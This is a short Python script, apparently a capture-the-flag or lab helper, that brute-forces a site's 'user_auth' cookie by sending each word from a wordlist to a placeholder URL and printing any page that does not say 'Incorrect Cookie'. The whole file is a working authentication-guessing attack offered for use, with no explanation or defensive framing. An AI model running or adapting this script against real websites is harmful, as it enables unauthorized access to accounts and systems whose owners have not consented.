import requests
lines = []

with open("raft-small-words.txt","r") as raft:
    lines = raft.readlines()
#replace top with whatever you want to use for bruteforcing

for i in lines:
    mycookie = {'user_auth':i.replace("\n","")}
    response = requests.get('websiteURLhere', cookies=mycookie)
    currentpagetext = response.text
  
    if "Incorrect Cookie" not in currentpagetext:
        print(response.text)
